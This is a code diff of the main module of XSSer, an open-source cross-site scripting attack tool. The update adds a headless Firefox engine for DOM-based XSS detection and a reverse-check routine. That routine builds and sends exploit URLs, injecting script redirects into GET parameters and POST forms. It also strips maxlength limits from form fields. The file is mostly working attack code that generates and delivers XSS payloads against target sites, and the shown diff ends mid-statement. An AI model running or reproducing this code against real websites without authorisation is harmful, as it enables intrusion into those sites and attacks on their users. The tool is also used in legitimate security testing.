@@ -4,7 +4,7 @@
 """
 This file is part of the XSSer project, https://xsser.03c8.net
 
-Copyright (c) 2010/2019 | psy <epsylon@riseup.net>
+Copyright (c) 2010/2020 | psy <epsylon@riseup.net>
 
 xsser is free software; you can redistribute it and/or modify it under
 the terms of the GNU General Public License as published by the Free
@@ -19,7 +19,12 @@ You should have received a copy of the GNU General Public License along
 with xsser; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import os, re, sys, datetime, hashlib, time, urllib.request, urllib.parse, urllib.error, cgi, traceback, webbrowser, random
+import os, re, sys, datetime, hashlib, time, cgi, traceback, webbrowser, random
+try:
+    import urllib.request, urllib.error, urllib.parse
+except:
+    print ("\n[Info] XSSer no longer supports Python2: (https://www.python.org/doc/sunset-python-2/). Try to run the tool with Python3.x.y... (ex: python3 xsser)\n")
+    sys.exit()
 from random import randint
 from base64 import b64encode, b64decode
 import core.fuzzing
@@ -45,7 +50,7 @@ from core.threadpool import ThreadPool, NoResultsPending
 from core.update import Updater
 
 # set to emit debug messages about errors (0 = off).
-DEBUG = 0
+DEBUG = False
 
 class xsser(EncoderDecoder, XSSerReporter):
     """
@@ -624,7 +629,7 @@ class xsser(EncoderDecoder, XSSerReporter):
 
     def get_url_payload(self, url, payload, query_string, user_attack_payload):
         """
-        Attack the given url with the given payload
+        Attack the given url within the given payload
         """
         options = self.options
         self._ongoing_attacks = {}
@@ -896,6 +901,8 @@ class xsser(EncoderDecoder, XSSerReporter):
                 target_url_params = urllib.parse.urlencode(target_params)
                 dest_url = target_url_params
         self._ongoing_attacks['url'] = url_orig_hash
+        if payload['browser'] == "[Document Object Model Injection]": # url decoding/unquote DOM payloads to execute url #fragments
+            dest_url = urllib.parse.unquote(dest_url)
         return dest_url, agent, referer, cookie
 
     def attack_url_payload(self, url, payload, query_string):
@@ -934,18 +941,17 @@ class xsser(EncoderDecoder, XSSerReporter):
             pool.addRequest(c.post, [[url, dest_url]], _cb, _error_cb)
             self._ongoing_requests += 1
 
-
     def error_attack_url_payload(self, c, url, request, error):
         self._ongoing_requests -= 1
         for reporter in self._reporters:
             reporter.mosquito_crashed(url, str(error[0]))
         dest_url = request.args[0]
-        self.report("Failed attempt (URL Malformed!?): " + url + "\n")
+        self.report("[Error] Failed attempt (URL Malformed!?): " + url + "\n")
         self.urlmalformed = True
         if self.urlmalformed == True and self.urlspoll[0] == url:
             self.land()
-        self.report(str(error[0]))
-        if self.options.verbose:
+        if DEBUG == True:
+            self.report(str(error[0]))
             traceback.print_tb(error[2])
         c.close()
         del c
@@ -1082,7 +1088,7 @@ class xsser(EncoderDecoder, XSSerReporter):
     def _report_attack_success(self, curl_handle, dest_url, payload,\
                                query_string, orig_url):
         """
-        report connection success of an attack
+        report connection success when attacking
         """
         if not orig_url in self.successful_urls:
             self.successful_urls.append(orig_url)
@@ -1411,13 +1417,31 @@ class xsser(EncoderDecoder, XSSerReporter):
             if b64_string.startswith("="):
                 b64_string = b64_string.replace("=", "")
             hashing = b64_string
-        if str(hashing) in c_body and "http-code: 200" in c_info: # [XSS CHECKPOINT: anti-false positives]
-            self.check_false_positives(hashing, c_body, dest_url, payload, query_string, orig_url, method)
+        if payload['browser'] == "[Document Object Model Injection]":
+            self.check_hash_using_dom(dest_url, payload, hashing, query_string, orig_url, method) # check hash using internal headless browser engine
+        else:
+            if str(hashing) in c_body and "http-code: 200" in c_info: # [XSS CHECKPOINT: anti-false positives]
+                self.check_false_positives(hashing, c_body, dest_url, payload, query_string, orig_url, method)
+            else:
+                self.add_failure(dest_url, payload, hashing, query_string, orig_url, method) # failed!
+
+    def check_hash_using_dom(self, dest_url, payload, hashing, query_string, orig_url, method):
+        if self.cookie_set_flag == False:
+            self.generate_headless_cookies(orig_url)
+            self.cookie_set_flag = True # cookie has been set!
+        try:
+            self.driver.get(dest_url) # GET
+            src = self.driver.page_source
+        except self.dom_browser_alert as alert_text: # handled with UnexpectedAlertPresentException 
+            if (hashing in str(alert_text)): # [XSS DOM CHECKPOINT: alert() dialog open!]
+                self.add_success(dest_url, payload, hashing, query_string, orig_url, method) # success!
+                self.token_arrived_hashes.append(hashing) # add token/hashing for counting
+            else:
+                self.add_failure(dest_url, payload, hashing, query_string, orig_url, method) # failed!
         else:
             self.add_failure(dest_url, payload, hashing, query_string, orig_url, method) # failed!
 
-    def check_false_positives(self, hashing, c_body, dest_url, payload, query_string, orig_url, method):
-        # some anti false positives checkers
+    def check_false_positives(self, hashing, c_body, dest_url, payload, query_string, orig_url, method): # some anti false positives checkers
         if str(self.options.discode) in c_body: # provided by user
             self.report("[Info] Reply contains code [ --discode ] provided to be discarded -> [DISCARDING!]\n")
             self.add_failure(dest_url, payload, hashing, query_string, orig_url, method) # failed!
@@ -1438,28 +1462,28 @@ class xsser(EncoderDecoder, XSSerReporter):
         Add an attack that failed to inject
         """
         if method == "heuristic":
-            self.report(" [ NOT-FOUND ] -> [ " + str(payload) + " ] : [ " + str(hashing)+ " ]")
+            self.report(" [NOT FOUND] -> [ " + str(payload) + " ] : [ " + str(hashing)+ " ]")
             self.hash_notfound.append((dest_url, "[Heuristic test]", method, hashing, query_string, payload, orig_url))
         elif method == "hashing check":
-            self.report(" [ NOT-FOUND ] -> [ " + str(hashing) + " ] : [ hashing_check ]")
+            self.report(" [NOT FOUND] -> [ " + str(hashing) + " ] : [ hashing_check ]")
             self.hash_notfound.append((dest_url, "[hashing check]", method, hashing, query_string, payload, orig_url))
         else:
-            self.report(" [ NOT-FOUND ] -> [ " + hashing + " ] : [ " + method + " ]")
+            self.report(" [NOT FOUND] -> [ " + hashing + " ] : [ " + method + " ]")
             self.hash_notfound.append((dest_url, payload['browser'], method, hashing, query_string, payload, orig_url))
           
     def add_success(self, dest_url, payload, hashing, query_string, orig_url, method='url'):
         """
-        Add an attack that managed to inject the code
+        Add an attack that have managed to inject code
         """
         if method == "heuristic":
-            self.report(" [ FOUND! ] -> [ " + str(payload) + " ] : [ " + str(hashing)+ " ]")
+            self.report(" [FOUND !!!] -> [ " + str(payload) + " ] : [ " + str(hashing)+ " ]")
             self.hash_found.append((dest_url, "[Heuristic test]", method, hashing, query_string, payload, orig_url))
         elif method == "hashing check":
-            self.report(" [ FOUND! ] -> [ " + str(payload) + " ] : [ " + str(hashing)+ " ]")
+            self.report(" [FOUND !!!] -> [ " + str(payload) + " ] : [ " + str(hashing)+ " ]")
             self.hash_found.append((dest_url, "[hashing check]", method, hashing, query_string, payload, orig_url))
         else:
             payload_sub =  payload['payload']
-            self.report(" [ FOUND! ] -> [ " + hashing + " ] : [ " + method + " ] -> [ " + payload_sub + " ]")
+            self.report(" [FOUND !!!] -> [ " + hashing + " ] : [ " + method + " ]")
             self.hash_found.append((dest_url, payload['browser'], method, hashing, query_string, payload, orig_url))
         for reporter in self._reporters:
             reporter.add_success(dest_url)
@@ -1469,31 +1493,83 @@ class xsser(EncoderDecoder, XSSerReporter):
             else:
                 self.do_token_check(orig_url, hashing, payload, query_string, dest_url)
 
-    def do_token_check(self, orig_url, hashing, payload, query_string, dest_url):
+    def create_headless_embed_browser(self):
+        agents = [] # user-agents
+        self.cookie_set_flag = False # used for cookie
+        f = open("core/fuzzing/user-agents.txt").readlines() # set path for user-agents
+        for line in f:
+            agents.append(line)
+        try:
+            agent = random.choice(agents).strip() # set random user-agent
+        except:
+            agent = "Privoxy/1.0" # set static user-agent
+        try: # selenium + firefox + gecko(bin)
+            from selenium import webdriver
+            from selenium.webdriver.firefox.options import Options as FirefoxOptions
+            from selenium.common.exceptions import UnexpectedAlertPresentException as UnexpectedAlertPresentException # used for search alert dialogs at DOM
+            self.dom_browser_alert = UnexpectedAlertPresentException
+            profile = webdriver.FirefoxProfile()
+            profile.set_preference("general.useragent.override", str(agent)) # set Firefox (profile) - random user-agent
+            profile.set_preference('browser.safebrowsing.enabled', True)
+            profile.set_preference('toolkit.telemetry.enabled', False)
+            profile.set_preference('webdriver_accept_untrusted_certs', True)
+            profile.set_preference('security.insecure_field_warning.contextual.enabled', False)
+            profile.set_preference('security.insecure_password.ui.enabled', False)
+            profile.set_preference('extensions.logging.enabled', False)
+            options = FirefoxOptions()
+            options.add_argument("-headless") # set Firefox (options) - headless mode
+            options.add_argument("-no-remote")
+            options.add_argument("-no-first-run")
+            options.add_argument("-app")
+            options.add_argument("-safe-mode")
+            current_dir = os.getcwd()
+            driver = webdriver.Firefox(options=options, firefox_profile=profile, executable_path=current_dir+"/core/driver/geckodriver", log_path=os.devnull) # wrapping!
+        except:
+            driver = None
+            self.token_arrived_flag = False
+            if DEBUG == True: 
+                traceback.print_exc()
+        return driver
+
+    def generate_GET_token_payload(self, orig_url, dest_url, query_string, hashing, payload, vector_found):
         if "VECTOR" in orig_url:
-            dest_url = orig_url
+           dest_url = orig_url
         else:
             if not dest_url.endswith("/"):
                 dest_url = dest_url + "/"
-            dest_url = orig_url + query_string + payload['payload']
+        dest_url = orig_url + query_string
+        dest_url = dest_url.split("#")[0]
+        p_uri = urlparse(dest_url)
+        uri = p_uri.netloc
+        path = p_uri.path
+        target_params = parse_qs(urlparse(dest_url).query, keep_blank_values=False)
+        for key, value in target_params.items():
+            if key == vector_found: # only replace parameters with valid hashes
+                target_params[key] = payload['payload']
+            else:
+                target_params[key] = target_params[key][0]
+        target_url_params = urllib.parse.urlencode(target_params)
+        dest_url = p_uri.scheme + "://" + uri + path + "?" + target_url_params
+        dest_url = urllib.parse.unquote(dest_url)
+        tok_url = self.generate_token_exploit(hashing, dest_url, payload)
+        return tok_url
 
-        tok_url = None
+    def generate_POST_token_payload(self, orig_url, dest_url, query_string, hashing, payload, vector_found):
+        if vector_found in dest_url:
+            v = dest_url.split(vector_found+"=")[1]
+            p = v.split("&")[0]
+            dest_url = dest_url.replace(p, payload['payload'])
+        dest_url = urllib.parse.unquote(dest_url)
+        tok_url = self.generate_token_exploit(hashing, dest_url, payload)
+        return tok_url
+
+    def generate_token_exploit(self, hashing, dest_url, payload):
         self_url = "http://localhost:19084/success/" + hashing
         shadow_js_inj = "document.location=document.location.hash.substring(1)"
         shadow_inj = "<script>" + shadow_js_inj + "</script>"
-        shadow_js_inj = shadow_js_inj
-        dest_url = dest_url.split("#")[0]
-
-        def requote(what):
-            return urllib.parse.quote_plus(what)
-        vector_and_payload = payload['payload']
         _e = self.encoding_permutations
-        if 'XSS' in dest_url:
-            dest_url = dest_url.replace('XSS', vector_and_payload)
-        if 'X1S' in dest_url:
-            dest_url = dest_url.replace('XSS', vector_and_payload)
         if 'VECTOR' in dest_url:
-            dest_url = dest_url.replace('VECTOR', vector_and_payload)
+            dest_url = dest_url.replace('VECTOR', payload['payload'])
         if '">PAYLOAD' in dest_url:
             tok_url = dest_url.replace('">PAYLOAD', _e('">' + shadow_inj))
             tok_url += '#' + self_url
@@ -1501,10 +1577,8 @@ class xsser(EncoderDecoder, XSSerReporter):
             tok_url = dest_url.replace("'>PAYLOAD", _e("'>" + shadow_inj))
             tok_url += '#' + self_url
         elif "javascript:PAYLOAD" in dest_url:
-            tok_url = dest_url.replace('javascript:PAYLOAD',
-                                       self.encoding_permutations("window.location='" + self_url+"';"))
-            tok_url = dest_url.replace("javascript:PAYLOAD",
-                                       _e("javascript:" + shadow_js_inj))
+            tok_url = dest_url.replace('javascript:PAYLOAD', self.encoding_permutations("window.location='" + self_url+"';"))
+            tok_url = dest_url.replace("javascript:PAYLOAD", _e("javascript:" + shadow_js_inj))
             tok_url+= '#' + self_url
         elif '"PAYLOAD"' in dest_url:
             tok_url = dest_url.replace('"PAYLOAD"', '"' + self_url + '"')
@@ -1513,17 +1587,14 @@ class xsser(EncoderDecoder, XSSerReporter):
         elif 'PAYLOAD' in dest_url and 'SRC' in dest_url:
             tok_url = dest_url.replace('PAYLOAD', self_url)
         elif "SCRIPT" in dest_url:
-            tok_url = dest_url.replace('PAYLOAD',
-                                      shadow_js_inj)
+            tok_url = dest_url.replace('PAYLOAD', shadow_js_inj)
             tok_url += '#' + self_url
         elif 'onerror="PAYLOAD"' in dest_url:
             tok_url = dest_url.replace('onerror="PAYLOAD"', _e('onerror="' + shadow_inj + '"'))
             tok_url+= '#' + self_url
         elif 'onerror="javascript:PAYLOAD"' in dest_url:
-            tok_url = dest_url.replace('javascript:PAYLOAD',
-            				self.encoding_permutations("window.location='" + self_url+"';"))
-            tok_url = dest_url.replace('onerror="javascript:PAYLOAD"',
-                                       _e('onerror="javascript:' + shadow_js_inj + '"'))
+            tok_url = dest_url.replace('javascript:PAYLOAD', self.encoding_permutations("window.location='" + self_url+"';"))
+            tok_url = dest_url.replace('onerror="javascript:PAYLOAD"', _e('onerror="javascript:' + shadow_js_inj + '"'))
             tok_url+= '#' + self_url
         elif '<PAYLOAD>' in dest_url:
             tok_url = dest_url.replace("<PAYLOAD>", _e(shadow_inj))
@@ -1537,15 +1608,79 @@ class xsser(EncoderDecoder, XSSerReporter):
             tok_url = dest_url.replace('PAYLOAD', self_url)
         elif 'url' in dest_url and 'PAYLOAD' in dest_url:
             tok_url = dest_url.replace('PAYLOAD', self_url)
-        self.final_attacks[hashing] = {'url': tok_url}
-        if tok_url:
-            try:
-                if self.options.reverseopen:
-                    self.report("\n" + "-"*25+"\n")
-                    self.report("[Info] Launching web browser (default) with a 'token' url...")
-                    self._webbrowser.open(tok_url)
-            except:
-                pass
+        return tok_url
+
+    def do_token_check(self, orig_url, hashing, payload, query_string, dest_url): # searching for a [100% VULNERABLE] XSS exploit!
+        tok_url = None
+        tok_total = []
+        if self.hash_found:
+            for l in self.hash_found:
+                vector_found = l[2]
+                hash_found = l[3]
+                if hashing in hash_found:
+                    if not self.options.postdata: # GET
+                        tok_url = self.generate_GET_token_payload(orig_url, dest_url, query_string, hashing, payload, vector_found)
+                    else: # POST
+                        tok_url = self.generate_POST_token_payload(orig_url, dest_url, query_string, hashing, payload, vector_found)
+                    if tok_url:
+                        self.send_token_exploit(orig_url, tok_url, hashing, vector_found)
+
+    def generate_headless_cookies(self, orig_url): # generate cookies for headless browser engine
+        self.driver.get(orig_url)
+        r_cookies = self.driver.get_cookies() # get cookies
+        if self.options.cookie:
+            from http.cookies import SimpleCookie # import SimpleCookie
+            cookie = SimpleCookie()
+            cookie.load(self.options.cookie)
+            for key, morsel in cookie.items():
+                for c in r_cookies:
+                    if key == c["name"]:
+                        c["value"] = str(morsel.value)
+            for c in r_cookies:
+                self.driver.add_cookie(c) # add cookies to driver
+
+    def send_token_exploit(self, orig_url, tok_url, hashing, vector_found):
+        try:
+            if self.cookie_set_flag == False:
+                self.generate_headless_cookies(orig_url)
+                self.cookie_set_flag = True # cookie has been set!
+            if self.options.postdata: # GET + web forms scrapping + POST
+                self.driver.get(orig_url) # GET request to store forms
+                tok_parsed = parse_qs(tok_url)
+                param_found = []
+                for param_parsed in tok_parsed: # find params
+                    param = self.driver.find_element_by_name(param_parsed) # by name
+                    if not param:
+                        param = self.driver.find_element_by_id(param_parsed) # by id
+                    if param:
+                        value = str(tok_parsed[param_parsed])
+                        if "#http://localhost:19084/success/"+str(hashing) in value: # re-parsing injected params for POST
+                            value = value.replace("#http://localhost:19084/success/"+str(hashing), "")
+                        if "<script>document.location=document.location.hash.substring(1)</script>" in value:
+                            value = value.replace("<script>document.location=document.location.hash.substring(1)", "<script src='http://localhost:19084/success/"+str(hashing)+"'>")
+                        if "['" in value:
+                            value = value.replace("['", "")
+                        if "']" in value:
+                            value = value.replace("']", "")
+                        param.send_keys(str(value))
+                        param_found.append(param)
+                        max_length = param.get_attribute("maxlength")
+                        if max_length: # bypass max length filters by changing DOM | black magic!
+                            self.driver.execute_script("arguments[0].setAttribute('maxlength', arguments[1])", param, '9999999')
+                if len(param_found) == len(tok_parsed): # form fully filled!
+                    login = self.driver.find_element_by_xpath("//*[@type='submit']") # find submit by type
+                    login.click() # click it!
+            else: # GET
+                self.driver.get(tok_url)
+            if tok_url not in self.final_attacks: 
+                self.final_attacks[hashing] = {'url': tok_url}
+                self.token_arrived_flag = True
+            else:
+                self.token_arrived_flag = False
+        except:
+            self.token_arrived_flag = False
+            if DEBUG == True:
+                traceback.print_exc()
 
     def _report_attack_failure(self, curl_handle, dest_url, payload,\
                                query_string, orig_url):
@@ -1918,9 +2053,10 @@ class xsser(EncoderDecoder, XSSerReporter):
                 print("\nTrying to update to the latest stable version...\n")
                 Updater() 
             except:
-                print("\nSomething was wrong!. You should clone XSSer manually with:\n")
+                print("Not any .git repository found!\n")
+                print("="*30)
+                print("\nTo have working this feature, you should clone XSSer with:\n")
                 print("$ git clone https://code.03c8.net/epsylon/xsser\n")
-
                 print("\nAlso you can try this other mirror:\n")
                 print("$ git clone https://github.com/epsylon/xsser\n")
             return []
@@ -2237,7 +2373,8 @@ class xsser(EncoderDecoder, XSSerReporter):
         def _error_cb(request, error):
             for reporter in self._reporters:
                 reporter.mosquito_crashed(url, str(error[0]))
-            traceback.print_tb(error[2])
+            if DEBUG == True:
+                traceback.print_tb(error[2])
 
         def crawler_main(args):
             return crawler.crawl(*args)
@@ -2259,7 +2396,7 @@ class xsser(EncoderDecoder, XSSerReporter):
             return func(*args)
         except Exception as e:
             self.report(error)
-            if DEBUG:
+            if DEBUG == True:
                 traceback.print_exc()
  
     def check_trace(self):
@@ -2563,18 +2700,23 @@ class xsser(EncoderDecoder, XSSerReporter):
         """
         Run xsser.
         """
-        #self._landing = False
+        self.token_arrived_flag = False # used for --reverse-check
+        self.success_arrived_flag = False # used for --reverse-check
+        self.token_arrived_hash = None # used for --reverse-check
+        self.token_arrived_hashes = [] # used for --reverse-check
+
         for reporter in self._reporters:
             reporter.start_attack()
+
         if opts:
             options = self.create_options(opts)
             self.set_options(options)
-        if not self.mothership and not self.hub:
+        if not self.hub:
             self.hub = HubThread(self)
             self.hub.start()
+
         options = self.options
         if options:
-            # step -1; order attacks
             if self.options.hash is True: # not fuzzing/heuristic when hash precheck
                 self.options.fuzz = False
                 self.options.script = False
@@ -2599,7 +2741,6 @@ class xsser(EncoderDecoder, XSSerReporter):
                 self.options.Cem = self.options.Cem.replace(" ","")
         else:
             pass
-        # step 0: third party tricks
         try:
             if self.options.imx: # create -fake- image with code injected
                 p = self.optionParser
@@ -2645,6 +2786,9 @@ class xsser(EncoderDecoder, XSSerReporter):
                 self.report("[XST Attack!] checking for HTTP TRACE method ...")
                 self.report('='*75)
             self.check_trace()
+ 
+        if self.options.reversecheck or self.options.dom: # generate headless embed web browser
+            self.driver = self.create_headless_embed_browser()
 
         if options.checktor:
             url = self.check_tor_url # TOR status checking site
@@ -2666,24 +2810,24 @@ class xsser(EncoderDecoder, XSSerReporter):
                 agents.append(line)
             agent = random.choice(agents).strip() # set random user-agent
             referer = "127.0.0.1"
-            print("\nSending request to: " + url + "\n")
+            print("\n[Info] Sending request to: " + url + "\n")
             print("-"*25+"\n")
             headers = {'User-Agent' : agent, 'Referer' : referer} # set fake user-agent and referer
             try:
-                import urllib.request, urllib.error, urllib.parse
                 req = urllib.request.Request(url, None, headers)
-                tor_reply = urllib.request.urlopen(req).read()
+                tor_reply = urllib.request.urlopen(req).read().decode('utf-8')
                 your_ip = tor_reply.split('<strong>')[1].split('</strong>')[0].strip() # extract public IP
                 if not tor_reply or 'Congratulations' not in tor_reply:
                     print("It seems that Tor is not properly set.\n")
-                    print(("IP address appears to be: " + your_ip + "\n"))
+                    print("IP address appears to be: " + your_ip + "\n")
                 else:
                     print("Congratulations!. Tor is properly being used :-)\n")
-                    print(("IP address appears to be: " + your_ip + "\n"))
+                    print("IP address appears to be: " + your_ip + "\n")
             except:
                 print("[Error] Cannot reach TOR checker system!. Are you connected?\n")
                 sys.exit(2) # return
 
+        # step 0: get workers
         nthreads = max(1, abs(options.threads))
         nworkers = len(self.pool.workers)
         if nthreads != nworkers:
@@ -2691,7 +2835,6 @@ class xsser(EncoderDecoder, XSSerReporter):
                 self.pool.dismissWorkers(nworkers-nthreads)
             else:
                 self.pool.createWorkers(nthreads-nworkers)
-
         for reporter in self._reporters:
             reporter.report_state('scanning')
         
@@ -2741,25 +2884,57 @@ class xsser(EncoderDecoder, XSSerReporter):
             time.sleep(0.2)
             for reporter in self._reporters:
                 reporter.report_state('landing... '+str(int(5.0 - (time.time() - start))))
-        if self.final_attacks:
-            self.report("-"*25+"\n")
-            self.report("[Info] Generating 'token' url:\n")
+        if self.final_attacks and self.options.reversecheck: # try a --reverse-check
+            final_attack_payloads = []
+            self.report("="*45)
+            self.report("[*] Reverse Check(s) Results:")
+            self.report("="*45 + "\n")
             for final_attack in self.final_attacks.values():
-                if not final_attack['url'] == None:
-                    self.report(final_attack['url'] , "\n")
-                self.report("="*50+"\n")
-                self.report("[Info] CONGRATULATIONS!!! <-> This vector is doing a remote connection... So, is: 100% VULNERABLE! ;-)\n")
-                self.report(",".join(self.successful_urls), "\n")
-                self.report("="*50 + "\n")
+                if final_attack not in final_attack_payloads:
+                    final_attack_payloads.append(final_attack)
+            for final in final_attack_payloads:
+                if self.hash_found:
+                    for l in self.hash_found:
+                        hashing = l[3]
+                        for k, v in final.items():
+                            if 'success/'+hashing in v: # find XSS "remote poison" payload!
+                                if not self.options.postdata: # GET
+                                    self.report("[Info] Generating 'XSS Tunneling' [HTTP GET] exploit:\n")
+                                else: # POST
+                                    self.report("[Info] Generating 'XSS Tunneling' [HTTP POST] exploit:\n")
+                                if "#http://localhost:19084/success/"+str(hashing) in v: # re-parsing injected params for POST
+                                    v = v.replace("#http://localhost:19084/success/"+str(hashing), "")
+                                if "<script>document.location=document.location.hash.substring(1)</script>" in v:
+                                    v = v.replace("<script>document.location=document.location.hash.substring(1)", "<script src='http://localhost:19084/success/"+str(hashing)+"'>")         
+                                self.report(v , "\n")
+                                self.report("-"*25+"\n")
+                                self.token_arrived_flag, self.success_arrived_flag, self.token_arrived_hash = self.hub.check_hash(hashing) # validate hashes (client+server)
+                                if self.token_arrived_flag == True and self.token_arrived_hash:
+                                    self.report("[Info] Validating HASHES:\n")
+                                    if self.success_arrived_flag == False:
+                                        self.report(" INJECTED: [", hashing, "] <-> RECEIVED: [", self.token_arrived_hash, "] -> [OK!]\n")
+                                    else:
+                                        self.report(" INJECTED: [", hashing, "] <-> RECEIVED: [KEYWORD: '/success/' via remote Cross URL Injection] -> [OK!]\n")
+                                    self.report("-"*25+"\n")
+                                    if self.options.postdata: # POST
+                                        self.report("[Info] XSS [HTTP POST] VECTOR [100% VULNERABLE] FOUND!:\n\n|-> "+"".join(self.successful_urls), "(POST:", query_string + ")\n")
+                                    else: # GET
+                                        self.report("[Info] XSS [HTTP GET] VECTOR [100% VULNERABLE] FOUND!:\n\n|-> "+"".join(self.successful_urls), "\n")
+                                    self.token_arrived_hashes.append(self.token_arrived_hash) # add token arrived hashes for counting
+                                else:
+                                    self.report("[Error] Remote XSS exploit [--reverse-check]  has FAILED! -> [PASSING!]\n")
+                self.report("-"*25+"\n")
+        if self.options.reversecheck or self.options.dom:
+            try:
+                self.driver.close() # end headless embed web browser driver!
+            except:
+                pass
         for reporter in self._reporters:
-            reporter.end_attack()
-        self.report("="*50)
+            reporter.end_attack() # end reports
         if self.mothership:
-            self.mothership.remove_reporter(self)
-            self.report("Mosquito(es) landed!")
-        else:
-            self.report("Mosquito(es) landed!")
-        self.report("="*50)
+            self.mothership.remove_reporter(self) # end mothership
+        if self.hub:
+            self.land() # end token hub server
         self.print_results()
 
     def sanitize_urls(self, urls):
@@ -2847,7 +3022,7 @@ class xsser(EncoderDecoder, XSSerReporter):
 
     def generate_real_attack_url(self, dest_url, description, method, hashing, query_string, payload, orig_url):
         """
-        Generate a real attack url by using data from a successful test.
+        Generate a real attack url using data from a successful test.
 
 	    This method also applies DOM stealth mechanisms.
         """
@@ -2883,8 +3058,7 @@ class xsser(EncoderDecoder, XSSerReporter):
         return dest_url
 
     def token_arrived(self, attack_hash):
-        if not self.mothership:
-            # only the mothership calls on token arriving.
+        if not self.mothership: # only mothership calls on token arrival
             self.final_attack_callback(attack_hash)
 
     def final_attack_callback(self, attack_hash):
@@ -2900,15 +3074,6 @@ class xsser(EncoderDecoder, XSSerReporter):
 
     def apply_postprocessing(self, dest_url, description, method, hashing, query_string, payload, orig_url):
         real_attack_url = self.generate_real_attack_url(dest_url, description, method, hashing, query_string, payload, orig_url)
-        #generate_shorturls = self.options.shorturls
-        #if generate_shorturls:
-        #    shortener = ShortURLReservations(self.options.shorturls)
-        #    if self.options.finalpayload or self.options.finalremote or self.options.b64 or self.options.dos:
-        #        shorturl = shortener.process_url(real_attack_url)
-        #        self.report("[/] Shortered URL (Final Attack):", shorturl)
-        #    else:
-        #        shorturl = shortener.process_url(dest_url)
-        #        self.report("[/] Shortered URL (Injection):", shorturl)
         return real_attack_url
 
     def report(self, *args):
@@ -2923,7 +3088,7 @@ class xsser(EncoderDecoder, XSSerReporter):
         """
         Print results from attack.
         """
-        self.report('\n' + '='*75)
+        self.report('='*75)
         total_injections = len(self.hash_found) + len(self.hash_notfound)
         if len(self.hash_found) + len(self.hash_notfound) == 0:
             pass
@@ -2947,10 +3112,19 @@ class xsser(EncoderDecoder, XSSerReporter):
                 self.report('='*75)
                 self.report("[*] List of XSS injections:")
                 self.report('='*75 + '\n')
-                if self.options.reversecheck:
-                    self.report("You have found: [ " + str(len(self.hash_found)) + " ] XSS vector(s)! -> [100% VULNERABLE]\n")
+                if len(self.hash_found) > 1:
+                    if len(self.token_arrived_hashes) > 0:
+                        if len(self.hash_found) == len(self.token_arrived_hashes):
+                            self.report("-> CONGRATULATIONS: You have found: [ " + str(len(self.hash_found)) + " ] XSS vectors [100% VULNERABLE]! ;-)\n")
+                        else:
+                            self.report("-> CONGRATULATIONS: You have found: [ " + str(len(self.token_arrived_hashes)) + " ] XSS [100% VULNERABLE] of [ " + str(len(self.hash_found)) + " ] possible XSS vectors! ;-)\n")
+                    else:
+                        self.report("-> CONGRATULATIONS: You have found: [ " + str(len(self.hash_found)) + " ] possible XSS vectors! ;-)\n")
                 else:
-                    self.report("You have found: [ " + str(len(self.hash_found)) + " ] possible (without --reverse-check) XSS vector(s)!\n")
+                    if len(self.token_arrived_hashes) > 0:
+                        self.report("-> CONGRATULATIONS: You have found: [ " + str(len(self.hash_found)) + " ] XSS vector [100% VULNERABLE]! ;-)\n")
+                    else:
+                        self.report("-> CONGRATULATIONS: You have found: [ " + str(len(self.hash_found)) + " ] possible XSS vector! ;-)\n")
                 self.report("---------------------" + "\n")
         if self.options.fileoutput:
             fout = open("XSSreport.raw", "w") # write better than append
@@ -3158,7 +3332,13 @@ class xsser(EncoderDecoder, XSSerReporter):
                     self.report("[*] Payload:", line[0])
                     if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                         self.report("[*] Final Attack:", attack_url)
-                    self.report("[!] Status: XSS FOUND!",  "\n", '-'*50, "\n")
+                    if self.token_arrived_flag == True:
+                        self.report("[!] Status: XSS FOUND! [100% VULNERABLE]",  "\n", '-'*50, "\n")
+                    else:
+                        if self.options.reversecheck:
+                            self.report("[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]",  "\n", '-'*50, "\n")
+                        else:
+                            self.report("[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]",  "\n", '-'*50, "\n")
                 if self.options.fileoutput:
                     fout.write("="*75)
                     fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
@@ -3166,14 +3346,38 @@ class xsser(EncoderDecoder, XSSerReporter):
                     for line in self.hash_found:
                         if line[4]:
                             if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
-                                fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND!\n\n")
+                                if self.token_arrived_flag == True:
+                                    fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [100% VULNERABLE]\n\n")
+                                else:
+                                    if self.options.reversecheck:
+                                        fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]\n\n")
+                                    else:
+                                        fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]\n\n")
                             else:
-                                fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Status: XSS FOUND!\n\n")
+                                if self.token_arrived_flag == True:
